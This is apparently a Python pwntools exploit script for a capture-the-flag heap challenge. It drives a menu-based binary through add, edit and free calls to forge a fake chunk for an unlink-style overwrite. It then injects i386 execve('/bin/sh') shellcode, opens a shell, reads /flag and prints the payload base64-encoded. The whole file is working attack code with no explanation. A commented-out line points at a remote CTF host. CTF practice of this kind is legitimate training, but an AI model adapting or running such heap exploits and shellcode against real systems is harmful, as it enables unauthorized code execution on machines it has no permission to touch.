from pwn import *
payload = ""
def add(size,c):
    global payload
    p.send("1".ljust(0x20,'\x00'))
    payload += "1".ljust(0x20,'\x00')
    p.send(str(size).ljust(0x20,'\x00'))
    payload += str(size).ljust(0x20,'\x00')
    p.send(c.ljust(size,'\x00'))
    payload += c.ljust(size,'\x00')
def free(idx):
    global payload
    p.send("2".ljust(0x20,'\x00'))
    payload += "2".ljust(0x20,'\x00')
    p.send(str(idx).ljust(0x20,'\x00'))
    payload += str(idx).ljust(0x20,'\x00')
def edit(idx,c):
    global payload
    p.send("3".ljust(0x20,'\x00'))
    payload += "3".ljust(0x20,'\x00')
    p.send(str(idx).ljust(0x20,'\x00'))
    payload += str(idx).ljust(0x20,'\x00')
    p.send(c)
    payload += c

p=process("./pwn")
#p = remote("df0a72047d6c.gamectf.com","10001")
context.arch='i386'
context.log_level='error'
p.readuntil(":\n")
sh='''
xor eax,eax
mov al,0xb
mov ebx,0x80e9f8b
xor ecx,ecx
xor edx,edx
int 0x80
'''
add(0x24,p32(0xdeadbeef)*7)#0
add(0x24,p32(0xdeadbeef)*9)#1
add(0x24,p32(0xdeadbeef)*9)#2
add(0x24,p32(0xdeadbeef)*9)#3
add(0x64,p32(0xdeadbeef)*7)#4
add(0x24,"\x00"*0x24)#5
edit(3,p32(0xdeadbeef)*9)
address=0x80eba44+8
edit(3,flat([0xdeadbeef,0x21,address-0xc,address-0x8])+'\xff'*0x10+p32(0x20)+'\x68')
free(4)
#0x80e9f74
edit(3,p32(0x80e9f74)+"\n")
edit(0,(p32(0x80e9f78)+p32(0x80e9f7c)+asm(sh)+'/bin/sh\x00').ljust(0x24,'\x00'))
#gdb.attach(p,'b* 0x80e9f7c')
p.send("4".ljust(0x20,'\x00'))
payload += "4".ljust(0x20,'\x00')
payload += "\ncat /flag\n"
print(payload.encode("base64"))

p.interactive()
